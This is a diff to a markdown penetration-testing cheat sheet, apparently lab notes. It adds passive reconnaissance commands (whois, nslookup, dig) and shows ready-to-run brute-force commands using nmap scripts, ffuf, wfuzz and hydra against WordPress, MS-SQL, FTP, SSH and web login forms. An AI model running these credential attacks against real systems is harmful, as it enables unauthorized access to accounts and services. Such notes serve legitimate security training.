@@ -185,14 +185,38 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 ```
 
 ---
+## Passive Recon
+
+find domain info
+`whois
+
+find IP address of a domain name
+`nslookup DOMAIN_NAME`
+`nslookup OPTIONS DOMAIN_NAME SERVER`
+`nslookup -type=a tryhackme.com 1.1.1.1`
+
+dig
+(more in depth than nslookup)
+`dig @SERVER DOMAIN_NAME TYPE`
+
+https://dnsdumpster.com/
+
+https://www.shodan.io/
+
+
+
+
+---
 # BruteForce
 
 ## Nmap
 
 WordPress brute force attack:
 `nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105
+
 Brute force attack against MS-SQL:
 `nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105
+
 FTP brute force attack:
 `nmap --script ftp-brute -p 21 192.168.1.105`
 ## CeWL
@@ -245,6 +269,8 @@ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the corr
 ## Hydra
 
 `hydra -l jan -P ~/rockyou/rockyou.txt -f -v ssh://10.10.37.200
+
+---
 
 `hydra -l '' -P 3digits.txt -f -v 10.10.123.72 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
 
